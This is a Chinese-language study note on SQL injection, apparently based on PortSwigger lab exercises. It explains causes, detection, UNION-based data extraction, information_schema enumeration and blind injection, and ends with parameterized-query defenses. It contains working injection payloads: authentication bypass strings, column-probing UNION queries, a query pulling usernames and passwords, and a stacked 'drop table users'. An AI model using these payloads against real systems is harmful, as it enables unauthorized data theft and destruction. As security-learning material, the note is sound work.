# SQL注入攻击笔记
[SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[SQL很好的一篇博客](https://www.cnblogs.com/Linkas/p/15123921.html#1%E4%BB%80%E4%B9%88%E6%98%AFsql%E6%B3%A8%E5%85%A5)


## 为什么会有SQL注入
* 外部输入的数据被当成代码拼接，导致恶意代码非预期的被执行
* SQL作为一种解释性语言，在运行时是由一个组件解释语言代码执行其中包含指令的语言
  * 而编译型语言是代码在生成时转换为机器指令，然后在运行时直接由使用该语言的计算机执行这些指令
  * 所以在解释型语言中，如果程序与用户进行交互，用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码

## 产生SQL注入需要的条件
* 输入的内容完全受用户控制，这样攻击者可以在WEB程序中事先定义好的SQL语句当中添加额外的SQL语句以实现非法的操作
* 输入的参数被带入到数据库中执行，就是传入的参数拼接到SQL语句当中，并且带入到数据库中进行查询

## SQL注入可能造成的危害
* interfere with the queries
* allow an attacker to view unauthorized data, which may belong to others
  * modify or delete unauthorized data, causing persistent changes of database
  * escalate SQL Injection attack to compromise the underlying server or other backend infrastructure, or perform a denial-of-service attack

## 如何发现SQL注入漏洞
1. https://0aba009004c4286dc0f83b1f004b00bd.web-security-academy.net/filter?category=Gifts
```HTML
这个链接后面有一个参数Gifts，明显是要执行SQL查询语句，类似于 select * from DB where category=Gifts
https://0aba009004c4286dc0f83b1f004b00bd.web-security-academy.net/filter?category=Gifts'
在后面加一个'，如果存在SQL注入，则一定报错
```
2. http://xxx/abc.php?id=2
```SQL
-- 对于这种参数为数字的URL地址，可使用 and 1=1 和 and 1=2来判断是否存在注入
-- 如果http://xxx/abc.php?id=2 and 1=1，运行正常，下一步
-- 如果http://xxx/abc.php?id=2 and 1=2,运行错误，则存在数字型注入
-- 以上等同于
select * from DB where id=2 and 1=1 --永真
select * from DB where id=2 and 1=2 
```
3. Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.<font color=red>时间注入--未完待续</font>
4. http://xxx/login.php?username=ytq
```SQL
-- 像这种登录当中的，可以使用绕过身份验证的方式，把后面注释掉
select * from DB where username='ytq' or 1=1-- ' and password='随意填'
```

## 常见的SQL注入手段
### 绕过身份认证
```SQL
-- ' or 1=1 --
select * from DB where username='ytq' or 1=1 --'and password='123' -- 注释掉password检查逻辑，使username逻辑永真
select * from DB where username='ytq' and password='123' or 1=1 --'' -- 使password检查永真
```
### 屏蔽掉多余的查询条件
```SQL
-- ' or 1=1 --
select * from DB where category='Gifts' or 1=1 --' and release=1
```

### 使用UNION进行SQL注入攻击
SQL的UNION操作允许一次性执行多个SELECT查询操作，并将多条查询语句的结果合并成一个结果

**_注意_**

* 要求多条查询语句的查询列数必须是一致的
* 要求多条查询语句的查询的每一列的类型和顺序最好一致
* UNION关键字默认去重，如果使用UNION ALL可以包含重复项
```SQL
select a, b from table1 union select c,d from table2
```
UNION与UNION ALL的区别：UNION是去重且排序的，而UNION ALL是不查重，不排序的
可以通过UNION操作

可以通过UNION操作来判断数据表中属性列的个数
```SQL
' order by 1 --
' order by 2 --
' order by 3 --
.......
```
如果数字超过了属性列的个数，则会报错

或者
```SQL
select * from DB where category='pets' union select null'
' UNION SELECT NULL -- 
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
......
```
Reason for using **NULL** because data types in each column must be compatible between 
the original and the injected queries. Since **NULL** is convertible to every commonly
used data type, using **NULL** maximizes the chance that the payload will succeed when the
column count is correct

不仅可以通过UNION操作来判断数据表中属性列的个数，还可以判断每个列的数据类型

**尤其要找字符型**
```SQL
' UNION SELECT 'a', NULL, NULL -- 
' UNION SELECT NULL,'a', NULL -- 
' UNION SELECT NULL, NULL, 'a' --
或者这种
' UNION SELECT 123, 'ABC', 123 --
```
同时UNION操作也具备同时查找多个数据表的数据

```SQL
select * from DB where category='Pets' union select username, password from users -- '
```
#### 通过SQL注入来探索数据库结构（库、表、列）
有几种方法

1. 当确定好列数，并确定好每一个属性列的数据类型后
```SQL
select 1,2,3,4
select 1,database(),3,4
......
```

2. 也可以使用另外一种方式，当确定好列数后，并确定每一个属性列的数据类型后
```SQL
-- 查看数据库版本
select @@version
-- 查看所有数据库名 -> schema_name
select * from information_schema.schemata
-- 查看数据库里的表 -> table_name
select * from information_schema.tables
-- 查看某个数据表中的列 -> column_nameSS
select * from information_schema.columns where table_name='xxx'
```
## SQL盲注
### 为什么有SQL盲注
之前的SQL注入攻击，一旦发起攻击，WEB应用会给予积极的反馈（显示基本信息）。
但很有时候，WEB应用只会根据查询返回查询是否正确/错误的信息——True OR False，而这种情况下就需要进行SQL盲注
### GROUP_CONCAT 与 GROUP BY
GROUP BY关键字可以根据一个或多个字段对查询结果进行分组，<font color=red> 每个分组标记相同的记录只会出现第一条</font>

GROUP_CONCAT会把每个分组的字段都显示出来

下面根据 tb_students_info 表中的 sex 字段进行分组查询，使用 GROUP_CONCAT() 函数将每个分组的 name 字段的值都显示出来。SQL 语句和运行结果如下
```SQL
SELECT 'sex', GROUP_CONCAT(name) FROM tb_students_info GROUP BY sex;
+------+----------------------------+
| sex  | GROUP_CONCAT(name)         |
+------+----------------------------+
| 女   | Henry,Jim,John,Thomas,Tom  |
| 男   | Dany,Green,Jane,Lily,Susan |
+------+----------------------------+
```
下面根据 tb_students_info 表中的 age 和 sex 字段进行分组查询。SQL 语句和运行结果如下
```SQL
SELECT age,sex,GROUP_CONCAT(name) FROM tb_students_info GROUP BY age,sex;
+------+------+--------------------+
| age  | sex  | GROUP_CONCAT(name) |
+------+------+--------------------+
|   21 | 女   | John               |
|   22 | 女   | Thomas             |
|   22 | 男   | Jane,Lily          |
|   23 | 女   | Henry,Tom          |
|   23 | 男   | Green,Susan        |
|   24 | 女   | Jim                |
|   25 | 男   | Dany               |
+------+------+--------------------+
```
先按照age字段进行分组，再把age记录按照sex字段进行分组

多个字段分组查询时，会先按照第一个字段进行分组。如果第一个字段中有相同的值，
MySQL 才会按照第二个字段进行分组。如果第一个字段中的数据都是唯一的，那么 MySQL 将不再对第二个字段进行分组。

GROUP_CONCAT单独使用，将组内的字符串连接成单个字符串
### 布尔盲注
length()，返回字符串长度，例如可以返回数据库名字的长度
```SQL
' union select 1,2,3 where length(database())={num} -- 
```
subtring(截取的字符串， 起始位置， 截取长度)
```SQL
' union select 1, 2, 3 where binary substring(database(), {num}, 1) = '{c}'#
```
### 时间盲注


## Stacked Queries和Union Queries的区别
Union Queries事实上有很多限制
* 要求多条查询语句的查询列数必须是一致的
* 要求多条查询语句的查询的每一列的类型和顺序最好一致
* UNION关键字默认去重，如果使用UNION ALL可以包含重复项

而Stacked Queries没这么多的事，可以执行任意的语句；<font color=red>Oracle不支持Stacked Queries;</font>
通常在SQL语句中，末尾加上;表示语句结束，而在一条语句结束后构造下一条语句，会一起执行
```SQL
select * from users where id='1';
select * from users where id='1'; drop table users--';
```

Stacked Queries局限性比较大，不是每一个环境都能用，受API和数据库引擎的影响比较大，权限不足的话有的时候也用不了


## 如何预防SQL注入
* Allows the server to handle compiling of the statment and execution(跟解释性语言的特性有关),* 使查询参数化 <font color=red> parameterized queries，也叫prepared statement</font>
  * Parameterized queries can be used for any situation where untrusted input appears as data within the query, 
including **the WHERE clause and values in an INSERT or UPDATE statement**. 
They can't be used to handle untrusted input in other parts of the query, **such as table or column names, or the ORDER BY clause.** 
Application functionality that places untrusted data into those parts of the query will need to take a different approach, 
such as **white-listing permitted input values**, or using different logic to deliver the required behavior.
  * For a parameterized query to be effective in preventing SQL injection, 
the string that is used in the query must always be a hard-coded constant, 
and must never contain any variable data from any origin. 
Do not be tempted to decide case-by-case whether an item of data is trusted, 
and continue using string concatenation within the query for cases that are considered safe. 
It is all too easy to make mistakes about the possible origin of data, 
or for changes in other code to violate assumptions about what data is tainted.
```SQL
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```
其实就是把参数和执行语句分开放
```SQL
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
* 采用正则表达式匹配union, select等关键字，如果匹配到就返回错误，对于'使用\进行转义
* 使用预编译语句，绑定变量
* 使用存储过程
  * 先将SQL语句放到数据库中
  * 尽量避免在存储过程中使用动态SQL语句
  * 如若无法避免，应使用严格的输入过滤或编码函数来处理用户输入的数据
* 使用白名单/黑名单限制或规定用户的输入
  * 黑名单不是很有效，因为用户输入的范围很大，很难去限制
  * 建议使用白名单
* 还有一种方式，在数据库执行SQL语句之前加一个protection layer，先去检查要执行的参数有没有问题

## SQL注入攻击流程总结
* 首先，观察是否有输入框可以任意输入，或者是https://0aba009004c4286dc0f83b1f004b00bd.web-security-academy.net/filter?category=Gifts类SQL查询链接
  * 输入框内尝试输入 xxx ' or 1=1 --，看是否有反应
  * 修改链接中的查询参数，https://0aba009004c4286dc0f83b1f004b00bd.web-security-academy.net/filter?category=Gifts' or 1=1 --
  * 如果都没有反应，观察返回的信息，如果只是True OR False，则选择SQL盲注
* 如果上面的WEB应用返回不是True OR False，则看查询的FLAG是否存在于表面，如果不存在则需要查询其他的数据库/数据表
  * 首先判断列数
    ```SQL
    ' order by 1 --
    ' order by 2--
      ......
    OR 
    ' UNION SELECT NULL -- 
    ' UNION SELECT NULL,NULL --
    ' UNION SELECT NULL,NULL,NULL --
    然后判断每一列的数据类型
    ' UNION SELECT 'a',123,'abc' --
    ```
  * 查询数据库名字，在数据类型为字符串的属性列上进行显示
    ```SQL
    ' UNION SELECT 1,2,3,'database' --
    OR 
    select * from information_schema.schemata
    ```